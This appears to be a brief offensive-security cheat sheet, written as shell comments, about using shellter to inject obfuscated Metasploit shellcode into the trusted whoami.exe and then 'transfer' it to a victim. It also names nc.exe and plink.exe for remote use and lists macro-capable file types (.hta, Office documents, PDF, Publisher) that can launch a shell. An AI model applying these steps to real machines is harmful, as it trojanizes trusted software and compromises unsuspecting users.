# - shellter
#   injects shellcode into existing [trusted] executable
#   obfuscates shellcode and its runtime unpacker

$ sudo shellter
# A = Automatic mode
# PE Target = whoami.exe
# a backup copy of whoami.exe will be made
# Stealth Mode = N
# answer yes if you need original binary to function properly after execution of payload
# Payload = C for custom
# Select Payload: metasploit-raw-output.bin
# Relective DLL Loader = N
# now transfer the whoami.exe to victim


# NOTICE: there is a collection of compiled/trusted windows binaries in
$ cd /usr/share/windows-resources/binaries/
# incl. `nc.exe`, `plink.exe`, `whoami.exe`
# which could be used remotely
# or injected w/ shellter and used remotely



# also note you can leverage other trusted file types 
# which contain embedded execution features:
# - `.hta` can exec shell via ActiveX, with user acceptance
# - `.doc/.xls `macro can exec shell via VBA Macro, with user acceptance
# - `.doc` can also have embedded .bat file, if user double-clicks and accepts
# - `.pdf` can execute macros, with user acceptance
# - `windows publisher` can run .doc-like macros with less user acceptance
